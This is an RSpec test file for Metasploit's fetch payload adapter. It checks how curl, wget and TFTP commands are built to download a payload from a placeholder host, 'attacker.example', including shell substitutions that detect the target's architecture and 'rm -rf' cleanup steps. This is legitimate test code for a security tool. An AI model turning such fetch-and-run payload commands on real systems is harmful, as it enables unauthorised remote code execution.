require 'spec_helper'
require 'tempfile'

RSpec.describe Msf::Payload::Adapter::Fetch do
  let(:harness_class) do
    Class.new do
      include Msf::Payload::Adapter::Fetch

      def initialize; end

      def fetch_protocol
        'HTTP'
      end

      def download_uri(_uri)
        'attacker.example:8080/payload_uri'
      end

      def _remote_destination
        '/tmp/payload'
      end

      def _execute_add(get_file_cmd)
        get_file_cmd
      end
    end
  end

  subject(:harness) { harness_class.new }

  # curl and wget both append the same dynamic-arch query string, and it must
  # stay byte-for-byte in sync with what #identify_arch
  # (lib/msf/core/payload/adapter/fetch/server/http.rb) expects to parse back out.
  shared_examples 'a dynamic-arch aware fetch command' do |method|
    it 'omits the arch/endian query string when dynamic_arch is false' do
      cmd = harness.public_send(method, 'payload_uri', false)
      expect(cmd).not_to include('?arch=')
    end

    it 'appends the exact arch/endian query string the fetch HTTP handler expects' do
      cmd = harness.public_send(method, 'payload_uri', true)
      expect(cmd).to include('?arch=$(uname -m)\&endian=$(printf %d \\\'$(head -c6 /bin/sh|tail -c1))')
    end

    it 'produces a shell fragment that resolves to a real arch/endian pair when executed' do
      cmd = harness.public_send(method, 'payload_uri', true)
      suffix = cmd[/\?arch=.*\)\)/]

      resolved = Tempfile.create('fetch_endian_probe') do |f|
        f.write("echo #{suffix}\n")
        f.flush
        `sh #{f.path}`.strip
      end

      expect(resolved).to match(/\A\?arch=\S+&endian=[12]\z/)

      query_string = resolved.sub(/\A\?/, '').split('&').each_with_object({}) do |pair, h|
        k, v = pair.split('=', 2)
        h[k] = v
      end
      expect(query_string['arch']).to eq(`uname -m`.strip)
    end
  end

  describe '#_generate_curl_command' do
    include_examples 'a dynamic-arch aware fetch command', :_generate_curl_command
  end

  describe '#_generate_wget_command' do
    include_examples 'a dynamic-arch aware fetch command', :_generate_wget_command
  end

  describe '#_remote_destination_nix' do
    let(:harness_class) do
      Class.new do
        include Msf::Payload::Adapter::Fetch

        def initialize
          @datastore = {
            'FETCH_FILELESS' => 'shell-search',
            'FETCH_WRITABLE_DIR' => '',
            'FETCH_FILENAME' => ''
          }
        end
        attr_accessor :datastore

        def srvuri
          'payload_uri'
        end
      end
    end

    subject(:harness) { harness_class.new }

    it 'returns the standard writable-dir path when called with failsafe: true' do
      expect(harness.send(:_remote_destination_nix, failsafe: true)).to eq('./payload_uri')
    end

    it 'does not memoize the failsafe: true result into @remote_destination_nix' do
      harness.send(:_remote_destination_nix, failsafe: true)
      expect(harness.instance_variable_get(:@remote_destination_nix)).to be_nil
    end

    it 'still returns the fileless placeholder on a later unqualified call, unaffected by the earlier failsafe: true peek' do
      harness.send(:_remote_destination_nix, failsafe: true)
      expect(harness.send(:_remote_destination_nix)).to eq('$f')
    end
  end

  describe '#_generate_tftp_command' do
    let(:harness_class) do
      Class.new do
        include Msf::Payload::Adapter::Fetch

        def initialize
          @datastore = {
            'FETCH_SRVPORT' => 69,
            'FETCH_WRITABLE_DIR' => '',
            'FETCH_FILENAME' => '',
            'FETCH_FILELESS' => 'none',
            'FETCH_DELETE' => false
          }
        end
        attr_accessor :datastore

        def fetch_protocol
          'TFTP'
        end

        def windows?
          false
        end

        def srvhost
          'attacker.example'
        end
      end
    end

    subject(:harness) { harness_class.new }

    it 'does not append a cleanup step when FETCH_DELETE is not set' do
      cmd = harness.send(:_generate_tftp_command, 'payload_uri')
      expect(cmd).not_to include('rm -rf')
    end

    it 'appends a delete cleanup step, like the generic (non-tftp) fetch path does, when FETCH_DELETE is set' do
      harness.datastore['FETCH_DELETE'] = true
      cmd = harness.send(:_generate_tftp_command, 'payload_uri')
      expect(cmd).to include('rm -rf ./payload_uri')
    end

    context 'when FETCH_FILELESS is shell-search' do
      before do
        harness.datastore['FETCH_FILELESS'] = 'shell-search'
        harness.datastore['FETCH_DELETE'] = true
        allow(harness).to receive(:linux?).and_return(true)
      end

      it 'still runs the delete cleanup on the fail-safe fallback path' do
        cmd = harness.send(:_generate_tftp_command, 'payload_uri')
        expect(cmd).to include('rm -rf ./payload_uri')
      end

      it 'closes the fail-safe if-block with a semicolon rather than corrupting the rm -rf argument list' do
        # Concatenating the cleanup directly in front of the fail-safe
        # branch's closing ` fi` without a separator would make `fi` a
        # second argument to `rm -rf` instead of closing the if-block.
        cmd = harness.send(:_generate_tftp_command, 'payload_uri')
        expect(cmd).to include('rm -rf ./payload_uri; fi')
        expect(cmd).not_to include('rm -rf ./payload_uri fi')
      end
    end
  end
end
